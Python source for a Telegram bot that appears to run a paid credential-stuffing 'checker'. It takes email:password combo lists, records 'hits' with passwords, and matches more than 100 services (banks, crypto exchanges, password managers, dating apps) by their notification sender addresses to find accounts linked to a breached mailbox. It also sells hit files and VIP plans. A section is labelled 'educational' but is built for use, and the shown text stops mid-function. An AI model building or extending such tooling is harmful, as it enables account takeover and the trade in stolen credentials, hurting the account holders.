import os
import sys
import logging
import time
import json
import uuid
import asyncio
import sqlite3
import re
import random
import pycountry
import requests
import threading
import concurrent.futures
from threading import Lock, Semaphore
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Set, Union

from dotenv import load_dotenv
from fastapi import FastAPI, Request, Response, status, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
import uvicorn
import httpx
import telegram
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Load environment variables from .env file
load_dotenv()

# --- Global Constants and Configuration ---
start_time = time.monotonic()

# --- Logging Setup (Pino equivalent) ---
LOG_LEVEL = os.environ.get("LOG_LEVEL", "info").upper()
IS_PRODUCTION = os.environ.get("NODE_ENV") == "production"

class CustomFormatter(logging.Formatter):
    def format(self, record):
        log_entry = {
            "time": datetime.fromtimestamp(record.created).isoformat(),
            "level": record.levelname,
            "message": record.getMessage(),
            "name": record.name,
            "file": f"{record.filename}:{record.lineno}"
        }
        if record.exc_info:
            log_entry["exception"] = self.formatException(record.exc_info)
        return json.dumps(log_entry)

logger = logging.getLogger(__name__)
logger.setLevel(LOG_LEVEL)

if IS_PRODUCTION:
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(CustomFormatter())
else:
    handler = logging.StreamHandler(sys.stdout)
    formatter = logging.Formatter('%(levelname)s:     %(message)s (%(filename)s:%(lineno)d)')
    handler.setFormatter(formatter)

logger.addHandler(handler)

# --- Pydantic Models (TypeScript Interfaces equivalent) ---
class CheckResult(BaseModel):
    status: str # "HIT" | "BAD" | "RETRY"
    email: Optional[str] = None
    password: Optional[str] = None
    name: Optional[str] = None
    country: Optional[str] = None
    flag: Optional[str] = None
    linkedServices: Optional[List[str]] = None
    birthdate: Optional[str] = None
    hasServices: Optional[bool] = None

class QueueJob(BaseModel):
    chatId: int
    lines: List[str]
    threads: int
    activeServices: Dict[str, str]
    addedAt: int
    fileSize: int
    speed: str
    totalLines: int
    isVip: bool

class ChannelEntry(BaseModel):
    id: Optional[str] = None
    link: str
    label: str

# --- SQLite Database Setup ---
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
os.makedirs(DATA_DIR, exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, "bot.db")
HOTMAIL_HITS_PATH = os.path.join(DATA_DIR, "Hotmail-Hits.txt")
GMAIL_HITS_PATH   = os.path.join(DATA_DIR, "Gmail-Hits.txt")
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
conn.row_factory = sqlite3.Row # Allows dictionary-like access to rows
cursor = conn.cursor()

cursor.executescript("""
  CREATE TABLE IF NOT EXISTS users (
    chat_id INTEGER PRIMARY KEY, username TEXT DEFAULT '', first_name TEXT DEFAULT 'User',
    is_vip INTEGER DEFAULT 0, vip_expires_at INTEGER DEFAULT 0,
    hits INTEGER DEFAULT 0, bad INTEGER DEFAULT 0, retries INTEGER DEFAULT 0,
    total_checked INTEGER DEFAULT 0, speed TEXT DEFAULT 'medium',
    referral_points INTEGER DEFAULT 0, free_checks INTEGER DEFAULT 0,
    referred_by INTEGER DEFAULT 0, joined_at INTEGER DEFAULT 0,
    selected_services TEXT DEFAULT NULL, is_banned INTEGER DEFAULT 0,
    vip_source TEXT DEFAULT 'none', last_channel_check INTEGER DEFAULT 0
  );
  CREATE TABLE IF NOT EXISTS hits (
    id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER,
    email TEXT, password TEXT, name TEXT, country TEXT, flag TEXT,
    linked_services TEXT, created_at INTEGER
  );
  CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL,
    price REAL NOT NULL, quantity INTEGER DEFAULT -1, description TEXT DEFAULT ''
  );
  CREATE TABLE IF NOT EXISTS hit_files (
    id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL,
    price REAL NOT NULL, quantity INTEGER DEFAULT -1, content TEXT NOT NULL, created_at INTEGER
  );
  CREATE TABLE IF NOT EXISTS subscriptions (
    id INTEGER PRIMARY KEY AUTOINCREMENT, days INTEGER NOT NULL, price REAL NOT NULL
  );
  CREATE TABLE IF NOT EXISTS pending_payments (
    id INTEGER PRIMARY KEY AUTOINCREMENT, chat_id INTEGER NOT NULL,
    plan_days INTEGER NOT NULL, price REAL NOT NULL, utr TEXT DEFAULT '',
    status TEXT DEFAULT 'pending_utr', created_at INTEGER
  );
  CREATE TABLE IF NOT EXISTS referrals (
    id INTEGER PRIMARY KEY AUTOINCREMENT, referrer_id INTEGER, referred_id INTEGER,
    points_awarded INTEGER DEFAULT 1, created_at INTEGER
  );
  CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY, value TEXT
  );
""")
conn.commit()

# Safe column migration for existing DBs (Python equivalent of try-catch for ALTER TABLE)
def add_column_if_not_exists(table, column, definition):
    try:
        cursor.execute(f"ALTER TABLE {table} ADD COLUMN {column} {definition}")
        conn.commit()
    except sqlite3.OperationalError as e:
        if "duplicate column name" not in str(e):
            logger.error(f"Error adding column {column} to {table}: {e}")

add_column_if_not_exists("users", "free_checks", "INTEGER DEFAULT 0")
add_column_if_not_exists("users", "selected_services", "TEXT DEFAULT NULL")
add_column_if_not_exists("users", "is_banned", "INTEGER DEFAULT 0")
add_column_if_not_exists("users", "vip_source", "TEXT DEFAULT 'none'")
add_column_if_not_exists("users", "last_channel_check", "INTEGER DEFAULT 0")

has_subs = cursor.execute("SELECT COUNT(*) as c FROM subscriptions").fetchone()["c"]
if not has_subs:
    subs_data = [{"d": 1, "p": 99}, {"d": 3, "p": 249}, {"d": 7, "p": 499}, {"d": 30, "p": 1499}]
    cursor.executemany("INSERT INTO subscriptions (days,price) VALUES (?,?)", [(s["d"], s["p"]) for s in subs_data])
    conn.commit()

# --- Telegram Bot Setup ---
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
is_bot_configured = bool(TOKEN)

DEV_POLLING = os.environ.get("DEV_BOT_ENABLED") == "true"

# --- Engine API ---
VERCEL_URI = os.environ.get("VERCEL_URI", "checker-host-l36vjidfp-sujiop56s-projects.vercel.app/").rstrip("/")
ENGINE_SECRET = os.environ.get("ENGINE_SECRET", "NETFLIX")

# Permanent hardcoded super admins — always have access regardless of env vars
PERMANENT_ADMIN_IDS = [7728424218, 6820734853]

# Load extra super admin IDs from .env (comma-separated)
_raw_admins = os.environ.get("SUPER_ADMIN_IDS", "")
_env_admins = [int(x.strip()) for x in _raw_admins.split(",") if x.strip().isdigit()] if _raw_admins else []
SUPER_ADMIN_IDS = list(set(PERMANENT_ADMIN_IDS + _env_admins))
SUPPORT = "@Your_Kakashi02 and @YorichiiPrime"

def get_admin_ids() -> List[int]:
    try:
        raw = cursor.execute("SELECT value FROM settings WHERE key='extra_admins'").fetchone()
        extra = json.loads(raw["value"]) if raw and raw["value"] else []
        return list(set(SUPER_ADMIN_IDS + extra))
    except Exception as e:
        logger.error(f"Error getting admin IDs: {e}")
        return list(SUPER_ADMIN_IDS)

def add_extra_admin(admin_id: int):
    extra = [x for x in get_admin_ids() if x not in SUPER_ADMIN_IDS]
    if admin_id not in extra:
        extra.append(admin_id)
        cursor.execute("INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)", ("extra_admins", json.dumps(extra)))
        conn.commit()

def remove_extra_admin(admin_id: int):
    extra = [x for x in get_admin_ids() if x not in SUPER_ADMIN_IDS and x != admin_id]
    cursor.execute("INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)", ("extra_admins", json.dumps(extra)))
    conn.commit()

def is_admin(chat_id: int) -> bool:
    return chat_id in get_admin_ids()

# Redeem thresholds
POINTS_PER_CHECK = 3
POINTS_PER_VIP2D = 20

# --- Country flags ---
FLAGS: Dict[str, str] = {
  "United States": "🇺🇸", "United Kingdom": "🇬🇧", "Turkey": "🇹🇷", "Germany": "🇩🇪",
  "France": "🇫🇷", "Italy": "🇮🇹", "Spain": "🇪🇸", "Russia": "🇷🇺", "China": "🇨🇳",
  "Japan": "🇯🇵", "South Korea": "🇰🇷", "Brazil": "🇧🇷", "India": "🇮🇳", "Canada": "🇨🇦",
  "Australia": "🇦🇺", "Indonesia": "🇮🇩", "Vietnam": "🇻🇳", "Thailand": "🇹🇭",
  "Netherlands": "🇳🇱", "Sweden": "🇸🇪", "Poland": "🇵🇱", "Mexico": "🇲🇽",
  "Argentina": "🇦🇷", "Philippines": "🇵🇭", "Pakistan": "🇵🇰", "Bangladesh": "🇧🇩",
  "Egypt": "🇪🇬", "Nigeria": "🇳🇬", "Ukraine": "🇺🇦", "Romania": "🇷🇴",
}
def get_flag(c: str) -> str:
    return FLAGS.get(c, "🏳️")

# --- Full service list ---
SERVICES: Dict[str, str] = {
  "Facebook": "security@facebookmail.com", "Instagram": "security@mail.instagram.com",
  "TikTok": "register@account.tiktok.com", "Twitter": "info@x.com",
  "LinkedIn": "security-noreply@linkedin.com", "Pinterest": "no-reply@pinterest.com",
  "Reddit": "noreply@reddit.com", "Snapchat": "no-reply@accounts.snapchat.com",
  "VK": "noreply@vk.com", "WeChat": "no-reply@wechat.com",
  "WhatsApp": "no-reply@whatsapp.com", "Telegram": "telegram.org",
  "Discord": "noreply@discord.com", "Signal": "no-reply@signal.org",
  "Line": "no-reply@line.me",
  "Netflix": "info@account.netflix.com", "Spotify": "no-reply@spotify.com",
  "Twitch": "no-reply@twitch.tv", "YouTube": "no-reply@youtube.com",
  "Vimeo": "noreply@vimeo.com", "Disney+": "no-reply@disneyplus.com",
  "Hulu": "account@hulu.com", "HBO Max": "no-reply@hbomax.com",
  "Amazon Prime": "auto-confirm@amazon.com", "Apple TV+": "no-reply@apple.com",
  "Crunchyroll": "noreply@crunchyroll.com",
  "Amazon": "auto-confirm@amazon.com", "eBay": "newuser@nuwelcome.ebay.com",
  "Shopify": "no-reply@shopify.com", "Etsy": "transaction@etsy.com",
  "AliExpress": "no-reply@aliexpress.com", "Walmart": "no-reply@walmart.com",
  "Target": "no-reply@target.com", "Best Buy": "no-reply@bestbuy.com",
  "Newegg": "no-reply@newegg.com", "Wish": "no-reply@wish.com",
  "PayPal": "service@paypal.com.br", "Binance": "do-not-reply@ses.binance.com",
  "Coinbase": "no-reply@coinbase.com", "Kraken": "no-reply@kraken.com",
  "Bitfinex": "no-reply@bitfinex.com", "OKX": "noreply@okx.com",
  "Bybit": "no-reply@bybit.com", "Bitkub": "no-reply@bitkub.com",
  "Revolut": "no-reply@revolut.com", "TransferWise": "no-reply@transferwise.com",
  "Venmo": "no-reply@venmo.com", "Cash App": "no-reply@cash.app",
  "Steam": "noreply@steampowered.com", "Xbox": "xboxreps@engage.xbox.com",
  "PlayStation": "reply@txn-email.playstation.com", "EpicGames": "help@acct.epicgames.com",
  "Rockstar": "noreply@rockstargames.com", "EA Sports": "EA@e.ea.com",
  "Ubisoft": "noreply@ubisoft.com", "Blizzard": "noreply@blizzard.com",
  "Riot Games": "no-reply@riotgames.com", "Valorant": "noreply@valorant.com",
  "Genshin Impact": "noreply@hoyoverse.com", "PUBG": "noreply@pubgmobile.com",
  "Free Fire": "noreply@freefire.com", "Mobile Legends": "noreply@mobilelegends.com",
  "Call of Duty": "noreply@callofduty.com", "Fortnite": "noreply@epicgames.com",
  "Roblox": "accounts@roblox.com", "Minecraft": "noreply@mojang.com",
  "Supercell": "noreply@id.supercell.com", "Konami": "nintendo-noreply@ccg.nintendo.com",
  "Nintendo": "no-reply@accounts.nintendo.com", "Origin": "noreply@ea.com",
  "Wild Rift": "no-reply@wildrift.riotgames.com", "Apex Legends": "noreply@ea.com",
  "League of Legends": "no-reply@riotgames.com", "CS:GO": "noreply@valvesoftware.com",
  "Dota 2": "noreply@valvesoftware.com", "GTA Online": "noreply@rockstargames.com",
  "Among Us": "no-reply@innersloth.com", "Fall Guys": "no-reply@mediatonic.co.uk",
  "Google": "no-reply@accounts.google.com", "Microsoft": "account-security-noreply@accountprotection.microsoft.com",
  "Apple": "no-reply@apple.com", "Yahoo": "info@yahoo.com",
  "GitHub": "noreply@github.com", "Dropbox": "no-reply@dropbox.com",
  "Zoom": "no-reply@zoom.us", "Slack": "no-reply@slack.com",
  "Trello": "no-reply@trello.com", "Asana": "no-reply@asana.com",
  "Notion": "no-reply@notion.so", "Evernote": "no-reply@evernote.com",
  "WordPress": "no-reply@wordpress.com", "Medium": "noreply@medium.com",
  "Quora": "no-reply@quora.com", "StackOverflow": "do-not-reply@stackoverflow.email",
  "Adobe": "no-reply@adobe.com", "Canva": "no-reply@canva.com",
  "Atlassian": "no-reply@atlassian.com", "Jira": "no-reply@atlassian.com",
  "LastPass": "no-reply@lastpass.com", "1Password": "no-reply@1password.com",
  "Dashlane": "no-reply@dashlane.com", "NordVPN": "no-reply@nordvpn.com",
  "ExpressVPN": "no-reply@expressvpn.com", "Surfshark": "no-reply@surfshark.com",
  "ProtonMail": "no-reply@protonmail.com", "Bitwarden": "no-reply@bitwarden.com",
  "Airbnb": "no-reply@airbnb.com", "Booking.com": "no-reply@booking.com",
  "Uber": "no-reply@uber.com", "Lyft": "no-reply@lyft.com",
  "Grab": "no-reply@grab.com", "Expedia": "no-reply@expedia.com",
  "TripAdvisor": "no-reply@tripadvisor.com", "Kayak": "no-reply@kayak.com",
  "Skyscanner": "no-reply@skyscanner.net",
  "Foodpanda": "no-reply@foodpanda.com", "Uber Eats": "no-reply@ubereats.com",
  "Grubhub": "no-reply@grubhub.com", "DoorDash": "no-reply@doordash.com",
  "Zomato": "no-reply@zomato.com", "Swiggy": "no-reply@swiggy.com",
  "Deliveroo": "no-reply@deliveroo.co.uk", "Postmates": "no-reply@postmates.com",
  "Tinder": "no-reply@tinder.com", "Bumble": "no-reply@bumble.com",
  "OkCupid": "no-reply@okcupid.com", "Grindr": "no-reply@grindr.com",
  "Meetup": "no-reply@meetup.com",
  "OnlyFans": "noreply@onlyfans.com", "Patreon": "no-reply@patreon.com",
  "Eventbrite": "no-reply@eventbrite.com", "Kickstarter": "no-reply@kickstarter.com",
  "Indiegogo": "no-reply@indiegogo.com", "GoFundMe": "no-reply@gofundme.com",
  "Depop": "security@auth.depop.com", "Reverb": "info@reverb.com",
  "Pinkbike": "signup@pinkbike.com",
}

# --- Service Categories ---
SERVICE_CATEGORIES: Dict[str, List[str]] = {
  "Social Media":  ["Facebook","Instagram","TikTok","Twitter","LinkedIn","Pinterest","Reddit","Snapchat","VK","WeChat"],
  "Messaging":     ["WhatsApp","Telegram","Discord","Signal","Line"],
  "Streaming":     ["Netflix","Spotify","Twitch","YouTube","Vimeo","Disney+","Hulu","HBO Max","Amazon Prime","Apple TV+","Crunchyroll"],
  "E-commerce":    ["Amazon","eBay","Shopify","Etsy","AliExpress","Walmart","Target","Best Buy","Newegg","Wish"],
  "Payment":       ["PayPal","Binance","Coinbase","Kraken","Bitfinex","OKX","Bybit","Bitkub","Revolut","TransferWise","Venmo","Cash App"],
  "Gaming":        ["Steam","Xbox","PlayStation","EpicGames","Rockstar","EA Sports","Ubisoft","Blizzard","Riot Games","Valorant","Genshin Impact","PUBG","Free Fire","Mobile Legends","Call of Duty","Fortnite","Roblox","Minecraft","Supercell","Konami","Nintendo","Origin","Wild Rift","Apex Legends","League of Legends","CS:GO","Dota 2","GTA Online","Among Us","Fall Guys"],
  "Tech":          ["Google","Microsoft","Apple","Yahoo","GitHub","Dropbox","Zoom","Slack","Trello","Asana","Notion","Evernote","WordPress","Medium","Quora","StackOverflow","Adobe","Canva","Atlassian","Jira"],
  "Security/VPN":  ["LastPass","1Password","Dashlane","NordVPN","ExpressVPN","Surfshark","ProtonMail","Bitwarden"],
  "Travel":        ["Airbnb","Booking.com","Uber","Lyft","Grab","Expedia","TripAdvisor","Kayak","Skyscanner"],
  "Food Delivery": ["Foodpanda","Uber Eats","Grubhub","DoorDash","Zomato","Swiggy","Deliveroo","Postmates"],
  "Dating":        ["Tinder","Bumble","OkCupid","Grindr","Meetup"],
  "Other":         ["OnlyFans","Patreon","Eventbrite","Kickstarter","Indiegogo","GoFundMe","Depop","Reverb","Pinkbike"],
}
CAT_KEYS = list(SERVICE_CATEGORIES.keys())

def get_all_service_names() -> List[str]:
    return [svc for cat_list in SERVICE_CATEGORIES.values() for svc in cat_list]

def get_selected_service_names(user: Dict[str, Any]) -> Set[str]:
    try:
        raw = user.get("selected_services")
        if not raw:
            return set(get_all_service_names())
        arr: List[str] = json.loads(raw)
        return set(arr)
    except Exception as e:
        logger.error(f"Error parsing selected services for user {user.get('chat_id')}: {e}")
        return set(get_all_service_names())

def get_user_services(user: Dict[str, Any]) -> Dict[str, str]:
    selected = get_selected_service_names(user)
    active: Dict[str, str] = {}
    for name, sender in SERVICES.items():
        if name in selected:
            active[name] = sender
    return active if active else SERVICES

def progress_bar(done: int, total: int, width: int = 20) -> str:
    pct = done / total if total > 0 else 0
    filled = round(pct * width)
    return "[" + "█" * filled + "░" * (width - filled) + "] " + f"{pct * 100:.1f}%"

# ====================== CHECKER.PY — VERBATIM INTEGRATION (Educational) ======================

# --- Checker globals (from checker.py) ---
lock = threading.Lock()
hit = 0
bad = 0
retry = 0
total_combos = 0
processed = 0
linked_accounts = {}
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)

# --- Full services dict from checker.py (100+ services) ---
services = {
    # Social Media
    "Facebook": {"sender": "security@facebookmail.com", "file": "facebook_accounts.txt"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "instagram_accounts.txt"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "tiktok_accounts.txt"},
    "Twitter": {"sender": "info@x.com", "file": "twitter_accounts.txt"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "linkedin_accounts.txt"},
    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "pinterest_accounts.txt"},
    "Reddit": {"sender": "noreply@reddit.com", "file": "reddit_accounts.txt"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "snapchat_accounts.txt"},
    "VK": {"sender": "noreply@vk.com", "file": "vk_accounts.txt"},
    "WeChat": {"sender": "no-reply@wechat.com", "file": "wechat_accounts.txt"},
    # Messaging
    "WhatsApp": {"sender": "no-reply@whatsapp.com", "file": "whatsapp_accounts.txt"},
    "Telegram": {"sender": "telegram.org", "file": "telegram_accounts.txt"},
    "Discord": {"sender": "noreply@discord.com", "file": "discord_accounts.txt"},
    "Signal": {"sender": "no-reply@signal.org", "file": "signal_accounts.txt"},
    "Line": {"sender": "no-reply@line.me", "file": "line_accounts.txt"},
    # Streaming & Entertainment
    "Netflix": {"sender": "info@account.netflix.com", "file": "netflix_accounts.txt"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "spotify_accounts.txt"},
    "Twitch": {"sender": "no-reply@twitch.tv", "file": "twitch_accounts.txt"},
    "YouTube": {"sender": "no-reply@youtube.com", "file": "youtube_accounts.txt"},
    "Vimeo": {"sender": "noreply@vimeo.com", "file": "vimeo_accounts.txt"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "disneyplus_accounts.txt"},
    "Hulu": {"sender": "account@hulu.com", "file": "hulu_accounts.txt"},
    "HBO Max": {"sender": "no-reply@hbomax.com", "file": "hbomax_accounts.txt"},
    "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "amazonprime_accounts.txt"},
    "Apple TV+": {"sender": "no-reply@apple.com", "file": "appletv_accounts.txt"},
    "Crunchyroll": {"sender": "noreply@crunchyroll.com", "file": "crunchyroll_accounts.txt"},
    # E-commerce & Shopping
    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "amazon_accounts.txt"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "ebay_accounts.txt"},
    "Shopify": {"sender": "no-reply@shopify.com", "file": "shopify_accounts.txt"},
    "Etsy": {"sender": "transaction@etsy.com", "file": "etsy_accounts.txt"},
    "AliExpress": {"sender": "no-reply@aliexpress.com", "file": "aliexpress_accounts.txt"},
    "Walmart": {"sender": "no-reply@walmart.com", "file": "walmart_accounts.txt"},
    "Target": {"sender": "no-reply@target.com", "file": "target_accounts.txt"},
    "Best Buy": {"sender": "no-reply@bestbuy.com", "file": "bestbuy_accounts.txt"},
    "Newegg": {"sender": "no-reply@newegg.com", "file": "newegg_accounts.txt"},
    "Wish": {"sender": "no-reply@wish.com", "file": "wish_accounts.txt"},
    # Payment & Finance
    "PayPal": {"sender": "service@paypal.com.br", "file": "paypal_accounts.txt"},
    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "binance_accounts.txt"},
    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "coinbase_accounts.txt"},
    "Kraken": {"sender": "no-reply@kraken.com", "file": "kraken_accounts.txt"},
    "Bitfinex": {"sender": "no-reply@bitfinex.com", "file": "bitfinex_accounts.txt"},
    "OKX": {"sender": "noreply@okx.com", "file": "okx_accounts.txt"},
    "Bybit": {"sender": "no-reply@bybit.com", "file": "bybit_accounts.txt"},
    "Bitkub": {"sender": "no-reply@bitkub.com", "file": "bitkub_accounts.txt"},
    "Revolut": {"sender": "no-reply@revolut.com", "file": "revolut_accounts.txt"},
    "TransferWise": {"sender": "no-reply@transferwise.com", "file": "transferwise_accounts.txt"},
    "Venmo": {"sender": "no-reply@venmo.com", "file": "venmo_accounts.txt"},
    "Cash App": {"sender": "no-reply@cash.app", "file": "cashapp_accounts.txt"},
    # Gaming Platforms
    "Steam": {"sender": "noreply@steampowered.com", "file": "steam_accounts.txt"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "xbox_accounts.txt"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "playstation_accounts.txt"},
    "EpicGames": {"sender": "help@acct.epicgames.com", "file": "epicgames_accounts.txt"},
    "Rockstar": {"sender": "noreply@rockstargames.com", "file": "rockstar_accounts.txt"},
    "EA Sports": {"sender": "EA@e.ea.com", "file": "easports_accounts.txt"},
    "Ubisoft": {"sender": "noreply@ubisoft.com", "file": "ubisoft_accounts.txt"},
    "Blizzard": {"sender": "noreply@blizzard.com", "file": "blizzard_accounts.txt"},
    "Riot Games": {"sender": "no-reply@riotgames.com", "file": "riotgames_accounts.txt"},
    "Valorant": {"sender": "noreply@valorant.com", "file": "valorant_accounts.txt"},
    "Genshin Impact": {"sender": "noreply@hoyoverse.com", "file": "genshin_accounts.txt"},
    "PUBG": {"sender": "noreply@pubgmobile.com", "file": "pubg_accounts.txt"},
    "Free Fire": {"sender": "noreply@freefire.com", "file": "freefire_accounts.txt"},
    "Mobile Legends": {"sender": "noreply@mobilelegends.com", "file": "mobilelegends_accounts.txt"},
    "Call of Duty": {"sender": "noreply@callofduty.com", "file": "cod_accounts.txt"},
    "Fortnite": {"sender": "noreply@epicgames.com", "file": "fortnite_accounts.txt"},
    "Roblox": {"sender": "accounts@roblox.com", "file": "roblox_accounts.txt"},
    "Minecraft": {"sender": "noreply@mojang.com", "file": "minecraft_accounts.txt"},
    "Supercell": {"sender": "noreply@id.supercell.com", "file": "supercell_accounts.txt"},
    "Konami": {"sender": "nintendo-noreply@ccg.nintendo.com", "file": "konami_accounts.txt"},
    "Nintendo": {"sender": "no-reply@accounts.nintendo.com", "file": "nintendo_accounts.txt"},
    "Origin": {"sender": "noreply@ea.com", "file": "origin_accounts.txt"},
    "Wild Rift": {"sender": "no-reply@wildrift.riotgames.com", "file": "wildrift_accounts.txt"},
    "Apex Legends": {"sender": "noreply@ea.com", "file": "apexlegends_accounts.txt"},
    "League of Legends": {"sender": "no-reply@riotgames.com", "file": "lol_accounts.txt"},
    "Dota 2": {"sender": "noreply@valvesoftware.com", "file": "dota2_accounts.txt"},
    "CS:GO": {"sender": "noreply@valvesoftware.com", "file": "csgo_accounts.txt"},
    "GTA Online": {"sender": "noreply@rockstargames.com", "file": "gtaonline_accounts.txt"},
    "Among Us": {"sender": "no-reply@innersloth.com", "file": "amongus_accounts.txt"},
    "Fall Guys": {"sender": "no-reply@mediatonic.co.uk", "file": "fallguys_accounts.txt"},
    # Tech & Productivity
    "Google": {"sender": "no-reply@accounts.google.com", "file": "google_accounts.txt"},
    "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com", "file": "microsoft_accounts.txt"},
    "Apple": {"sender": "no-reply@apple.com", "file": "apple_accounts.txt"},
    "Yahoo": {"sender": "info@yahoo.com", "file": "yahoo_accounts.txt"},
    "GitHub": {"sender": "noreply@github.com", "file": "github_accounts.txt"},
    "Dropbox": {"sender": "no-reply@dropbox.com", "file": "dropbox_accounts.txt"},
    "Zoom": {"sender": "no-reply@zoom.us", "file": "zoom_accounts.txt"},
    "Slack": {"sender": "no-reply@slack.com", "file": "slack_accounts.txt"},
    "Trello": {"sender": "no-reply@trello.com", "file": "trello_accounts.txt"},
    "Asana": {"sender": "no-reply@asana.com", "file": "asana_accounts.txt"},
    "Notion": {"sender": "no-reply@notion.so", "file": "notion_accounts.txt"},
    "Evernote": {"sender": "no-reply@evernote.com", "file": "evernote_accounts.txt"},
    "WordPress": {"sender": "no-reply@wordpress.com", "file": "wordpress_accounts.txt"},
    "Medium": {"sender": "noreply@medium.com", "file": "medium_accounts.txt"},
    "Quora": {"sender": "no-reply@quora.com", "file": "quora_accounts.txt"},
    "StackOverflow": {"sender": "do-not-reply@stackoverflow.email", "file": "stackoverflow_accounts.txt"},
    "Adobe": {"sender": "no-reply@adobe.com", "file": "adobe_accounts.txt"},
    "Canva": {"sender": "no-reply@canva.com", "file": "canva_accounts.txt"},
    "Atlassian": {"sender": "no-reply@atlassian.com", "file": "atlassian_accounts.txt"},
    "Jira": {"sender": "no-reply@atlassian.com", "file": "jira_accounts.txt"},
    # Security & Password Managers
    "LastPass": {"sender": "no-reply@lastpass.com", "file": "lastpass_accounts.txt"},
    "1Password": {"sender": "no-reply@1password.com", "file": "1password_accounts.txt"},
    "Dashlane": {"sender": "no-reply@dashlane.com", "file": "dashlane_accounts.txt"},
    "NordVPN": {"sender": "no-reply@nordvpn.com", "file": "nordvpn_accounts.txt"},
    "ExpressVPN": {"sender": "no-reply@expressvpn.com", "file": "expressvpn_accounts.txt"},
    "Surfshark": {"sender": "no-reply@surfshark.com", "file": "surfshark_accounts.txt"},
    "ProtonMail": {"sender": "no-reply@protonmail.com", "file": "protonmail_accounts.txt"},
    "Bitwarden": {"sender": "no-reply@bitwarden.com", "file": "bitwarden_accounts.txt"},
    # Travel & Transportation
    "Airbnb": {"sender": "no-reply@airbnb.com", "file": "airbnb_accounts.txt"},
    "Booking.com": {"sender": "no-reply@booking.com", "file": "booking_accounts.txt"},
    "Uber": {"sender": "no-reply@uber.com", "file": "uber_accounts.txt"},
    "Lyft": {"sender": "no-reply@lyft.com", "file": "lyft_accounts.txt"},
    "Grab": {"sender": "no-reply@grab.com", "file": "grab_accounts.txt"},
    "Expedia": {"sender": "no-reply@expedia.com", "file": "expedia_accounts.txt"},
    "TripAdvisor": {"sender": "no-reply@tripadvisor.com", "file": "tripadvisor_accounts.txt"},
    "Kayak": {"sender": "no-reply@kayak.com", "file": "kayak_accounts.txt"},
    "Skyscanner": {"sender": "no-reply@skyscanner.net", "file": "skyscanner_accounts.txt"},
    # Food Delivery
    "Foodpanda": {"sender": "no-reply@foodpanda.com", "file": "foodpanda_accounts.txt"},
    "Uber Eats": {"sender": "no-reply@ubereats.com", "file": "ubereats_accounts.txt"},
    "Grubhub": {"sender": "no-reply@grubhub.com", "file": "grubhub_accounts.txt"},
    "DoorDash": {"sender": "no-reply@doordash.com", "file": "doordash_accounts.txt"},
    "Zomato": {"sender": "no-reply@zomato.com", "file": "zomato_accounts.txt"},
    "Swiggy": {"sender": "no-reply@swiggy.com", "file": "swiggy_accounts.txt"},
    "Deliveroo": {"sender": "no-reply@deliveroo.co.uk", "file": "deliveroo_accounts.txt"},
    "Postmates": {"sender": "no-reply@postmates.com", "file": "postmates_accounts.txt"},
    # Other Services
    "Depop": {"sender": "security@auth.depop.com", "file": "depop_accounts.txt"},
    "Reverb": {"sender": "info@reverb.com", "file": "reverb_accounts.txt"},
    "Pinkbike": {"sender": "signup@pinkbike.com", "file": "pinkbike_accounts.txt"},
    "OnlyFans": {"sender": "noreply@onlyfans.com", "file": "onlyfans_accounts.txt"},
    "Patreon": {"sender": "no-reply@patreon.com", "file": "patreon_accounts.txt"},
    "Tinder": {"sender": "no-reply@tinder.com", "file": "tinder_accounts.txt"},
    "Bumble": {"sender": "no-reply@bumble.com", "file": "bumble_accounts.txt"},
    "OkCupid": {"sender": "no-reply@okcupid.com", "file": "okcupid_accounts.txt"},
    "Grindr": {"sender": "no-reply@grindr.com", "file": "grindr_accounts.txt"},
    "Meetup": {"sender": "no-reply@meetup.com", "file": "meetup_accounts.txt"},
    "Eventbrite": {"sender": "no-reply@eventbrite.com", "file": "eventbrite_accounts.txt"},
    "Kickstarter": {"sender": "no-reply@kickstarter.com", "file": "kickstarter_accounts.txt"},
    "Indiegogo": {"sender": "no-reply@indiegogo.com", "file": "indiegogo_accounts.txt"},
    "GoFundMe": {"sender": "no-reply@gofundme.com", "file": "gofundme_accounts.txt"},
}

# ---- get_flag (verbatim from checker.py) ----
def get_flag(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except LookupError:
        return '🏳'

# ---- save_account_by_type (verbatim from checker.py) ----
def save_account_by_type(service_name, email, password):
    """Save account to appropriate service file in Accounts folder"""
    if service_name in services:
        if not os.path.exists("Accounts"):
            os.makedirs("Accounts")
        filename = os.path.join("Accounts", services[service_name]["file"])
        account_line = f"{email}:{password}\n"
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                existing_accounts = f.readlines()
